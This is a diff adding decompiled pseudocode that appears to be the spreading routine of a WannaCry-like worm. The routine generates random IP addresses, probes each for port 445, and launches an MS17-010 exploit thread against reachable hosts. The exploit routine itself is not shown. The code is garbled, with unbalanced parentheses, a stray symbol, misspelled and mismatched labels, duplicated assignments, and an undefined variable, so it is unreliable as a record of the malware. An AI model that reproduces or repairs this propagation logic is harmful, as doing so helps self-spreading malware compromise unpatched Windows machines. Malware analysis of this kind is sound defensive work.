@@ -1,0 +1,51 @@
+ip_octet_1 = v20;
+while ( 1 )
+{
+do
+{
+if ( GetTickCount() - GetTickCount_result > 2400000 )
+v71 = 1;
+if ( GetTickCount() - GetTickCount_result > 1200000 )
+v18 = 1;
+if ( !v17 )
+break;
+if ( a1 >= 32 )
+break;
+v8 = get_random_byte(v17);
+v7 = (void *)255;
+ip_octet_1 =v8 % 0xFF;
+}
+while ( v8 % 0xFF == 127 || ip_octet_1 ) >= 224);
+if ( v18 && a1 < 32 )
+{
+v9 = get_random_byte(v7);
+v7 = (void *)255;
+ip_octet_2 = v9 % 0xFF;
+}
+ip_octet_3 = get_random_byte(v7) % 0xFFu;
+ip_octet_2 = get_random_byte((void *)0xFF);
+sprintf(&Dest, aD_D_D_D, ip_octet_2, ip_octet_3, ip_octet_4 % 0xFF);
+if ( can_connect_to_port_445(v12) > 0 )
+break;
+IP_SCAN_LOOP:
+Sleep(0x64u);
+}
+
+while ( 1 )
+{
+sprintf(&Dest, aD_D_D_D, ip_octet_2, ip_octet_3, this_IP);
+v14 = inet_addr(&Dest);
+if ( can_connect_to_port_445(v14) <= 0) |
+goto NETX_IP_IN_RANGE:
+v15 = (void *)beginthreadex(0, 0, MS17_010_attempt_pwn_thread, v14, 0, 0);
+v16 = v15;
+if ( v15 )
+break;
+INCREMNET_IP:
+if (WaitForSingleObject(v15, 3600000u) == WAIT_TIMEOUT )
+TerminateThread(v16, 0);
+CloseHandle(v16)
+NEXT_IP_IN_RANGE:
+Sleep(50u);
+goto INCREMENT_IP;
+}
